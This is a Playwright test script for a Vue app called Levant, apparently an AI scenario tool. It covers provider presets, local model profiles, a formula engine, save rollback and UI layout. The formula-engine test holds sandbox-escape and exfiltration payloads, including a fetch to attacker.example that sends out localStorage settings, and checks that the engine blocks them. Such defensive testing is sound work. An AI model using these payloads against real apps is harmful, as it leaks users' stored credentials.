import json
import os

from playwright.sync_api import sync_playwright


BASE_URL = os.environ.get("LEVANT_TEST_URL", "http://127.0.0.1:8012")
CHROME_PATH = os.environ.get(
    "LEVANT_CHROME_PATH",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
)


def prepare_page(browser, viewport):
    page = browser.new_page(viewport=viewport)
    errors = []
    page.on("pageerror", lambda error: errors.append(f"pageerror: {error}"))
    page.on(
        "console",
        lambda message: errors.append(f"console: {message.text}")
        if message.type == "error"
        else None,
    )
    settings = {
        "api_profiles": [
            {
                "id": 1,
                "name": "Local Test",
                "provider": "OpenAI",
                "baseUrl": "http://localhost:11434/v1",
                "model": "local-test-model",
                "key": "",
                "presetId": "ollama",
                "capabilities": {},
            }
        ],
        "active_profile_id": 1,
        "proxy": {"enabled": False, "port": "7890"},
        "autonomy": {"mode": "autonomous", "autoRepair": True},
        "ui": {"lang": "zh", "theme": "terminal"},
    }
    serialized_settings = json.dumps(settings)
    page.add_init_script(
        f"""
        localStorage.setItem('levant_settings', JSON.stringify({serialized_settings}));
        localStorage.setItem('levant_version', '1.21');
        """
    )
    page.goto(BASE_URL)
    page.wait_for_load_state("networkidle")
    page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            proxy.enterApp();
            proxy.showSettings = false;
        }"""
    )
    page.wait_for_timeout(350)
    return page, errors


def assert_catalog(page):
    catalog = page.evaluate(
        """() => window.LevantModelCatalog.presets.map(preset => ({
            id: preset.id,
            docsUrl: preset.docsUrl,
            apiKeyUrl: preset.apiKeyUrl,
            local: preset.local,
            requiresApiKey: preset.requiresApiKey
        }))"""
    )
    by_id = {item["id"]: item for item in catalog}
    for preset_id in ["kimi", "glm", "ollama", "lmstudio", "vllm", "localai"]:
        assert preset_id in by_id, f"Missing preset: {preset_id}"
        assert by_id[preset_id]["docsUrl"], f"Missing docs URL: {preset_id}"
    assert by_id["kimi"]["apiKeyUrl"]
    assert by_id["glm"]["apiKeyUrl"]
    for preset_id in ["ollama", "lmstudio", "vllm", "localai"]:
        assert by_id[preset_id]["local"] is True
        assert by_id[preset_id]["requiresApiKey"] is False
    preserved = page.evaluate(
        """() => window.LevantModelCatalog.migrateProfile({
            provider: 'OpenAI',
            baseUrl: 'https://api.openai.com/v1',
            model: 'gpt-4o',
            presetId: 'openai'
        }).model"""
    )
    assert preserved == "gpt-4o"


def assert_local_profile_without_key(page):
    result = page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            const before = proxy.settings.api_profiles.length;
            proxy.openProfileEditor(null);
            proxy.applyPresetToEditor('ollama');
            proxy.editingProfileData.name = 'Ollama Empty Key';
            proxy.editingProfileData.model = 'qwen-local';
            proxy.editingProfileData.key = '';
            proxy.saveProfile();
            return {
                before,
                after: proxy.settings.api_profiles.length,
                saved: proxy.settings.api_profiles.at(-1)
            };
        }"""
    )
    assert result["after"] == result["before"] + 1
    assert result["saved"]["presetId"] == "ollama"
    assert result["saved"]["key"] == ""


def assert_local_profile_is_usable(page):
    result = page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            proxy.showSettings = false;
            return {
                usable: proxy.hasUsableModelProfile(proxy.settings.api),
                configured: proxy.ensureActiveModelConfigured(),
                settingsOpened: proxy.showSettings
            };
        }"""
    )
    assert result == {
        "usable": True,
        "configured": True,
        "settingsOpened": False,
    }


def assert_formula_engine(page):
    result = page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            const engine = window.LevantFormulaEngine;
            const regions = [
                {
                    id: 'r1',
                    name: 'Layer Region',
                    ownerId: 'p1',
                    stats: { income: 5 }
                }
            ];
            const ctx = {
                globals: { bonus: 3 },
                players: [{ id: 'p1', stats: { base: 4 } }],
                map: { regions, pins: [] },
                turn: 2,
                utils: {
                    getPlayerStat: (id, key) => {
                        const player = ctx.players.find(item => item.id === id);
                        return Number(player?.stats?.[key]) || 0;
                    },
                    getOwnedRegionCount: ownerId => {
                        return regions.filter(item => item.ownerId === ownerId).length;
                    },
                    sumAllRegionStat: key => {
                        return regions.reduce(
                            (sum, item) => sum + (Number(item.stats?.[key]) || 0),
                            0
                        );
                    },
                    sumRegionStat: (ownerId, key) => {
                        return regions.reduce(
                            (sum, item) => item.ownerId === ownerId
                                ? sum + (Number(item.stats?.[key]) || 0)
                                : sum,
                            0
                        );
                    }
                }
            };
            const legal = engine.evaluate(
                "self.stats['base'] > 2 && turn === 2"
                    + " ? Math.max(self.stats['base'], 4)"
                    + " + ctx.utils.sumAllRegionStat('income')"
                    + " + globals['bonus']"
                    + " : 0",
                { self: { id: 'p1', stats: { base: 4 } }, ctx }
            );

            window.__formulaPwned = false;
            const blocked = [
                "fetch('https://attacker.example')",
                "globalThis.__formulaPwned = true",
                "self.constructor.constructor('window.__formulaPwned=true')()"
            ].map(formula => engine.validate(
                formula,
                { self: { id: 'p1', stats: {} }, ctx }
            ).valid);

            proxy.timeline = [];
            proxy.global_vars = [
                {
                    key: 'bonus',
                    value: 3,
                    type: 'number',
                    visibility: 'editable'
                },
                {
                    key: 'derived',
                    value: 0,
                    type: 'number',
                    visibility: 'readonly',
                    formula: "globals['bonus'] * 2"
                }
            ];
            proxy.rule_sets = [{
                id: 'schema',
                name: 'Formula Test',
                fields: [
                    {
                        key: 'base',
                        label: 'Base',
                        type: 'number',
                        visibility: 'editable'
                    },
                    {
                        key: 'derived',
                        label: 'Derived',
                        type: 'number',
                        visibility: 'readonly',
                        formula: "self.stats['base']"
                            + " + ctx.globals['derived']"
                            + " + ctx.utils.sumRegionStat(self.id, 'income')"
                    }
                ]
            }];
            proxy.players = [{
                id: 'p1',
                name: 'Formula Entity',
                schemaId: 'schema',
                stats: { base: 4, derived: 0 }
            }];
            proxy.map_data = {
                activeLayerId: 'layer-regions',
                layers: [
                    {
                        id: 'layer-regions',
                        type: 'region',
                        name: 'Regions',
                        visible: true,
                        data: regions
                    },
                    {
                        id: 'layer-markers',
                        type: 'marker',
                        name: 'Markers',
                        visible: true,
                        data: [{
                            id: 'pin1',
                            label: 'Layer Marker',
                            x: 10,
                            y: 20
                        }]
                    }
                ]
            };
            proxy.recalculateState();
            const integrated = {
                global: proxy.global_vars[1].value,
                entity: proxy.players[0].stats.derived,
                regions: proxy.getAllWorldRegions().map(item => item.name),
                pins: proxy.getAllWorldPins().map(item => item.label)
            };

            proxy.rule_sets[0].fields[1].formula =
                "fetch('https://attacker.example/?data='"
                + " + localStorage.getItem('levant_settings'))";
            proxy.recalculateState();

            return {
                legal,
                blocked,
                pwned: window.__formulaPwned,
                integrated,
                rejectedValue: proxy.players[0].stats.derived
            };
        }"""
    )
    assert result["legal"] == 12
    assert result["blocked"] == [False, False, False]
    assert result["pwned"] is False
    assert result["integrated"] == {
        "global": 6,
        "entity": 15,
        "regions": ["Layer Region"],
        "pins": ["Layer Marker"],
    }
    assert result["rejectedValue"] == 0


def assert_failed_autonomy_save_rolls_back(page):
    result = page.locator("#app").evaluate(
        """async element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            const snapshot = () => JSON.stringify({
                rule_sets: proxy.rule_sets,
                lorebook: proxy.lorebook,
                players: proxy.players,
                timeline: proxy.timeline,
                global_vars: proxy.global_vars,
                currentTurnPending: proxy.pendingEvents,
                map_data: proxy.map_data,
                pendingTurnRange: proxy.pendingTurnRange
            });
            const before = snapshot();
            const undoDepth = proxy.undoStack.length;
            const redoDepth = proxy.redoStack.length;
            const originalSaveGame = proxy.saveGame;
            proxy.saveGame = async () => {
                throw new Error('simulated disk failure');
            };

            let message = '';
            try {
                await proxy.commitValidatedEvents([{
                    factionId: 'global',
                    factionIds: ['global'],
                    timeStart: 'Test',
                    timeEnd: 'Test',
                    summary: 'Rollback test',
                    content: 'This event must not remain in memory.',
                    impacts: []
                }]);
            } catch (error) {
                message = error.message;
            } finally {
                proxy.saveGame = originalSaveGame;
            }

            const after = snapshot();
            return {
                message,
                unchanged: after === before,
                undoRestored: proxy.undoStack.length === undoDepth,
                redoRestored: proxy.redoStack.length === redoDepth
            };
        }"""
    )
    assert "rolled back" in result["message"]
    assert result["unchanged"] is True, result
    assert result["undoRestored"] is True, result
    assert result["redoRestored"] is True, result


def assert_settings(page):
    page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            proxy.showSettings = true;
            proxy.openProfileEditor(null);
            proxy.applyPresetToEditor('ollama');
        }"""
    )
    dialog = page.get_by_role("dialog", name="Settings")
    dialog.wait_for(state="visible")
    page.wait_for_timeout(400)
    assert "app-modal" in (dialog.get_attribute("class") or "")
    options = dialog.locator("select").nth(2).locator("option").all_text_contents()
    option_text = " ".join(options)
    for label in ["Kimi / Moonshot", "GLM / Zhipu AI", "Ollama", "LM Studio", "vLLM", "LocalAI"]:
        assert label in option_text
    refresh = dialog.get_by_title("从提供商刷新模型")
    assert refresh.is_enabled()
    assert dialog.get_by_text("(可选)", exact=True).is_visible()
    dialog.locator(".app-modal-body").evaluate(
        "element => { element.scrollTop = element.scrollHeight; }"
    )
    page.wait_for_timeout(150)
    guide_title = dialog.get_by_text("厂商文档与控制台", exact=True)
    assert guide_title.is_visible()
    hrefs = dialog.locator("a").evaluate_all(
        "elements => elements.map(element => element.href)"
    )
    assert "https://platform.kimi.com/docs/" in hrefs
    assert "https://docs.bigmodel.cn/" in hrefs
    assert "https://docs.ollama.com/openai" in hrefs
    page.screenshot(path="/tmp/levant-settings-providers.png")


def assert_script_modal(page, mobile=False):
    page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            proxy.showSettings = false;
            proxy.openScriptGenModal();
        }"""
    )
    page.get_by_text("AI 剧本生成", exact=True).wait_for(state="visible")
    page.wait_for_timeout(400)
    modal = page.locator(".app-modal").filter(has_text="AI 剧本生成")
    assert modal.is_visible()
    if mobile:
        params_tab = modal.get_by_text("生成参数", exact=True)
        assert params_tab.is_visible()
        params_tab.click()
        page.wait_for_timeout(150)
    assert modal.get_by_text("高级生成参数", exact=True).is_visible()
    assert modal.get_by_text("生成规则集数量", exact=True).is_visible()
    assert modal.get_by_text("生成实体数量", exact=True).is_visible()
    screenshot = (
        "/tmp/levant-mobile-script-params.png"
        if mobile
        else "/tmp/levant-desktop-script.png"
    )
    page.screenshot(path=screenshot)


def assert_god_mode(page, mobile=False):
    page.locator("#app").evaluate(
        """element => {
            const app = element.__vue_app__;
            const proxy = app?._instance?.proxy
                || app?._container?._vnode?.component?.proxy
                || element._vnode?.component?.proxy;
            proxy.showScriptGenModal = false;
            proxy.showSettings = false;
            proxy.mobileActiveView = 'console';
            proxy.tabs.right = 'godmode';
        }"""
    )
    page.wait_for_timeout(400)
    draft = page.locator(".command-draft-pane")
    text_area = page.locator(".god-mode-input")
    result_pane = page.locator(".command-result-pane")
    assert draft.is_visible()
    assert text_area.is_visible()
    assert not result_pane.is_visible()
    draft_box = draft.bounding_box()
    input_box = text_area.bounding_box()
    assert draft_box and input_box
    minimum = 115 if mobile and page.viewport_size["width"] > page.viewport_size["height"] else 220
    assert input_box["height"] >= minimum, input_box
    assert draft_box["height"] > input_box["height"]
    screenshot = (
        "/tmp/levant-mobile-godmode.png"
        if mobile
        else "/tmp/levant-desktop-godmode.png"
    )
    page.screenshot(path=screenshot)


def main():
    with sync_playwright() as playwright:
        launch_options = {"headless": True}
        if os.path.exists(CHROME_PATH):
            launch_options["executable_path"] = CHROME_PATH
        browser = playwright.chromium.launch(**launch_options)

        desktop, desktop_errors = prepare_page(
            browser, {"width": 1440, "height": 900}
        )
        assert_catalog(desktop)
        assert_local_profile_without_key(desktop)
        assert_local_profile_is_usable(desktop)
        assert_formula_engine(desktop)
        assert_failed_autonomy_save_rolls_back(desktop)
        assert_settings(desktop)
        desktop.locator("#app").evaluate(
            """element => {
                const app = element.__vue_app__;
                const proxy = app?._instance?.proxy
                    || app?._container?._vnode?.component?.proxy
                    || element._vnode?.component?.proxy;
                proxy.showSettings = false;
            }"""
        )
        assert_script_modal(desktop)
        assert_god_mode(desktop)

        mobile, mobile_errors = prepare_page(
            browser, {"width": 390, "height": 844}
        )
        assert_script_modal(mobile, mobile=True)
        assert_god_mode(mobile, mobile=True)

        errors = desktop_errors + mobile_errors
        desktop.close()
        mobile.close()
        browser.close()
        assert not errors, "\n".join(errors)

    print(json.dumps({"status": "ok", "url": BASE_URL}, ensure_ascii=False))


if __name__ == "__main__":
    main()
